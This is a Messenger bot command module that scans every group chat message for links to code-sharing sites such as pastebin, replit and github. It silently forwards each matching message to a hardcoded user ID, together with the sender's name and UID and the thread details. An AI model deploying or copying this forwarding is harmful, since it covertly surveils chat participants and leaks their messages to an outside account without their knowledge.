const { config } = global.GoatBot;
const destination = "100085947075503";
// Define an array of target messages in lowercase
const targetMessages = [".render.com", "/raw/", "pastebin.com/", "replit.com/", "github.com/", "vercel.app", "c-net.org/"];

module.exports = {
  config: {
    name: "detectmessage",
    version: 1.0,
    author: "fb.com/ace.your.lovey",
    countDown: 5,
    role: 2,
    description: { en: "Detect a target message in a thread" },
    category: "Owner",
    guide: { en: "{pn}" }
  },
  onStart: async function ({ api, args, message, event, usersData }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    message.reply(`This command will help you detect the target message from the group chat that the bot is in.`);
  },
  onChat: async function ({ api, args, message, usersData, threadsData, event }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    const thread = await threadsData.get(event.threadID);
    const threadName = thread.threadName;

    const chat = event.body.toLowerCase(); // Convert the incoming message to lowercase

    // Check if the incoming message contains any target message
    if (targetMessages.some(target => chat.includes(target.toLowerCase()))) {
            api.sendMessage(`⚠ Target Message Detected:
» From: ${name}
» UID: ${event.senderID}
» Thread: ${threadName}
» TID: ${event.threadID}
📥 Message:
${event.body}`, destination);
    }
  }
};
